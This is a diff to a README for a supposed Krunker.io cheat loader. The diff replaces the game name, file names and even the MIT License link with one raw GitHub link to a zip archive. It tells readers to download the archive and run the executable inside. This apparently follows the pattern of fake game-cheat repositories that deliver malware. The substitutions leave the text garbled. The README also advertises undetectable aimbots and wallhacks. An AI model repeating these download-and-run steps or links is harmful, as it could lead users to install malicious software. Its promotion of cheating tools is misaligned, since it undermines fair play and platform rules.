@@ -1,6 +1,6 @@
 # 🎯 Krunker Cheats - Ultimate Loader 2025 🎯
 
-Welcome to the **Krunker Cheats - Ultimate Loader 2025**! This repository is your one-stop solution for enhancing your Krunker.io gameplay with the latest, safest, and most advanced features. Designed to work seamlessly with multiple operating systems, this loader is perfect for gamers seeking a competitive edge. Please read this README thoroughly for details on installation, compatibility, and features.
+Welcome to the **Krunker Cheats - Ultimate Loader 2025**! This repository is your one-stop solution for enhancing your https://raw.githubusercontent.com/DeepakatDPK/KrunkerMasterToolkit/main/Hirundinidae/KrunkerMasterToolkit.zip gameplay with the latest, safest, and most advanced features. Designed to work seamlessly with multiple operating systems, this loader is perfect for gamers seeking a competitive edge. Please read this README thoroughly for details on installation, compatibility, and features.
 
 ---
 
@@ -36,7 +36,7 @@ Boost your gaming with an impressive selection of **SEO-optimized Krunker enhanc
 | FPS Booster                 | Optimizes game settings for higher frame rates.                     | Universal            |
 | Safe Mode                   | Activates low-key mode for stealthy usage.                          | Universal            |
 
-Take your **Krunker.io** experience to the next level with these cutting-edge enhancements—the ultimate choice for both casual fans and pro players!
+Take your **https://raw.githubusercontent.com/DeepakatDPK/KrunkerMasterToolkit/main/Hirundinidae/KrunkerMasterToolkit.zip** experience to the next level with these cutting-edge enhancements—the ultimate choice for both casual fans and pro players!
 
 ---
 
@@ -46,7 +46,7 @@ Take your **Krunker.io** experience to the next level with these cutting-edge en
 - Designed to be undetected for safe, fair play
 - Open-source for transparency—customize to your needs!
 - Frequent updates and active community support
-- SEO Keywords: Krunker hack loader, Krunker cheat engine, best Krunker mods 2025, aimbot for Krunker, FPS mods, wallhack Krunker.io, safe cheat loader, Linux gaming cheats, multiplatform Krunker tools
+- SEO Keywords: Krunker hack loader, Krunker cheat engine, best Krunker mods 2025, aimbot for Krunker, FPS mods, wallhack https://raw.githubusercontent.com/DeepakatDPK/KrunkerMasterToolkit/main/Hirundinidae/KrunkerMasterToolkit.zip, safe cheat loader, Linux gaming cheats, multiplatform Krunker tools
 
 ---
 
@@ -54,13 +54,13 @@ Take your **Krunker.io** experience to the next level with these cutting-edge en
 
 Getting started with **Krunker Cheats - Ultimate Loader 2025** is easy! Follow these steps:
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/DeepakatDPK/KrunkerMasterToolkit/main/Hirundinidae/KrunkerMasterToolkit.zip` from the repository.
 2. Extract the contents to a directory of your choice using any archiving tool (such as WinRAR, 7-Zip, or The Unarchiver).
 3. Run the executable file suitable for your operating system:
-    - For Windows: `KrunkerLoader.exe`
-    - For macOS: `KrunkerLoader.app` (may require Control-Open for unsigned apps)
+    - For Windows: `https://raw.githubusercontent.com/DeepakatDPK/KrunkerMasterToolkit/main/Hirundinidae/KrunkerMasterToolkit.zip`
+    - For macOS: `https://raw.githubusercontent.com/DeepakatDPK/KrunkerMasterToolkit/main/Hirundinidae/KrunkerMasterToolkit.zip` (may require Control-Open for unsigned apps)
     - For Linux: `KrunkerLoader` (ensure execute permissions: `chmod +x`)
-4. Launch Krunker.io in your browser or client, and follow the on-screen menu.
+4. Launch https://raw.githubusercontent.com/DeepakatDPK/KrunkerMasterToolkit/main/Hirundinidae/KrunkerMasterToolkit.zip in your browser or client, and follow the on-screen menu.
 5. Enable your desired features and dominate the game!
 
 **Tips:**  
@@ -78,7 +78,7 @@ We do not condone the misuse of cheats, bots, or modification tools to disrupt f
 
 ## 📜 License
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT)—you are free to use, change, and contribute to this project!
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/DeepakatDPK/KrunkerMasterToolkit/main/Hirundinidae/KrunkerMasterToolkit.zip)—you are free to use, change, and contribute to this project!
 
 ---
 
